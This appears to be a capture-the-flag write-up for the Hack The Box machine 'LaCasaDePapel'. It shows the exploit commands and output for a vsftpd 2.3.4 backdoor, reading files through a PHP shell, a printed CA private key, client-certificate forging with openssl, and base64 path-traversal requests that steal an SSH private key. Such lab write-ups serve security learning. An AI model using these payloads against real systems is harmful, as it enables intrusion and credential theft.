<center><h1>LaCasaDePapel</h1></center>
<br>
<center><h3>Summary</h3></center>
<br>
- Use an old FTP exploit to open a backdoor on the box allowing us to get a Psy php shell
- Grab a CA key file off the box and a CA crt from the webpage
- Use the CA key file and CA crt file to generate a .p12 file and log into the webpage
- Use an LFI vulnerability to grab and SSH private key
- Use the private key to SSH in
- Replace the memcached.ini file with our own to spawn a reverse shell
<br><br>
First we start with an Nmap scan.

```
# Nmap 7.70 scan initiated Mon May 27 18:16:51 2019 as: nmap -sV -sC -T4 10.10.10.131
Nmap scan report for 10.10.10.131
Host is up (0.11s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|   http/1.1
|_  http/1.0
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 27 18:17:24 2019 -- 1 IP address (1 host up) scanned in 32.68 seconds
```
<br>
A few ports are open but the one that peaks my interest is FTP. I know for a face that <b>vsftpd 2.3.4</b> is vulnerable. I will use the metasploit module <b>exploit/unix/ftp/vsftpd_234_backdoorv2.3.4 Backdoor Command Execution</b> for this.
```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
The only thing that we have to set is the RHOSTS. Running the exploit we see that the expoit completed but no sessions was created
```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.131
RHOSTS => 10.10.10.131
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.131:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
If we run the exploit a second time we get a different message. It says that the port for the backdoor is open but its not a shell which most likely means its not a bash shell.
```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.131:21 - The port used by the backdoor bind listener is already open
[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
[*] Exploit completed, but no session was created.
```
Running an nmap scan on port 6200 will show that the port is now open
```
# nmap -p 6200 10.10.10.131
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-18 12:30 EDT
Nmap scan report for 10.10.10.131
Host is up (0.096s latency).

PORT     STATE SERVICE
6200/tcp open  lm-x

Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
```
We can use netcat to connect to the backdoor. Once in we are greeted with a Psy Shell which is basically a php Shell
```
# nc -nv 10.10.10.131 6200
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.10.131:6200.
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```
To navigate this shell we will need to use php commands. Listing the <b>/home</b> directory will reveal multiple different users
```
scandir('/home');
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
```
If we list the contents of each users home directory, we will see a couple things.
- The user flag is located in <b>/home/berlin</b>
- There is a  <b>ca.key</b> file located at <b>/home/nairobi</b>

```
scandir('/home/berlin');
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
scandir('/home/dali');
=> [
     ".",
     "..",
     ".ash_history",
     ".config",
     ".qmail-default",
     ".ssh",
     "server.js",
   ]
scandir('/home/nairobi');
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
dir('/home/oslo');
=> [
     ".",
     "..",
     "Maildir",
     "inbox.jade",
     "index.jade",
     "node_modules",
     "package-lock.json",
     "server.js",
     "static",
   ]
```
Seeing that <b>ca.key</b> made me want to check out port 443. Navigating to the webpage my hunch was confirmed when it asks us for a client certificate to access the full webpage.

<center><img src="/htb/lacasadepapel/webpage.png"></center>
<br>
I copied the key to my host machine by reading the <b>ca.key</b> file and then pasting the contents into an empty file.
```
readfile("/home/nairobi/ca.key");
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
```
Now the next step is to grab the <b>.crt</b> file from your web browser. in firefox navigate to <b>Preferences > Privacy and Security > View Certificates</b>. Once there, in the top right click on <b>Authorities</b> and scroll down until you see the certificate for <b>lacasadepapelhtb.htb</b> and then import/download it to you host machine.

<center><img src="/htb/lacasadepapel/certificate.png"></center>
<br>
Now we need to create our client certificate. To do this we will use <b>openssl</b> in combination with our <b>ca.key</b> file and <b>lacasadepapelhtb.crt</b> file. It will ask you for a password, just leave it blank.
```
# openssl pkcs12 -export -clcerts -in lacasadepapelhtb.crt -inkey ca.key -out lacasadepapel.p12
Enter Export Password:
Verifying - Enter Export Password:
```
Now we need to import the <b>lacasadepapel.p12</b> into firefox. Go back to <b>Preferences > Privacy and Security > View Certificates</b> except this time choose <b>Your Certificates</b>. Then choose import and select the certificate.

<center><img src="/htb/lacasadepapel/p12.png"></center>
<br>
Now if we go back to the webpage and refresh it, we no longer get the client certificate error.

<center><img src="/htb/lacasadepapel/in.png"></center>
<br>
Looking through all the <b>avi</b> files I dont find anything since they are all empty but I looking a the source code of the webpage does reveal something interesting at the bottom. We see some files stored in a <b>/file</b> directory with files that look like they are encoded in base64. Using this we can do 2 things:
-Grab the user flag in <b>/home/berlin</b>
-Grab an ssh private key from <b>/home/berlin/.ssh/id_rsa</b> and log in with it
```
# echo -n "../../../../home/berlin/user.txt" | base64
Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vdXNlci50eHQ=

https://10.10.10.131/file/Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vdXNlci50eHQ=
```
<center><img src="/htb/lacasadepapel/flag.png"></center>
<br>
Now we grab the ssh key
```
# echo -n "../../../../home/berlin/.ssh/id_rsa" | base64
Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E=

https://10.10.10.131/file/Li4vLi4vLi4vLi4vaG9tZS9iZXJsaW4vLnNzaC9pZF9yc2E=
```
<center><img src="/htb/lacasadepapel/key.png"></center>
<br>
Now my first thought was to SSH in as the user <b>berlin</b> since that is where we found the key but it didnt work. I decided to try the other users and it ended up working with the user <b>professor</b>
```
# ssh -i id_rsa professor@10.10.10.131

 _             ____                  ____         ____                  _
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$
```
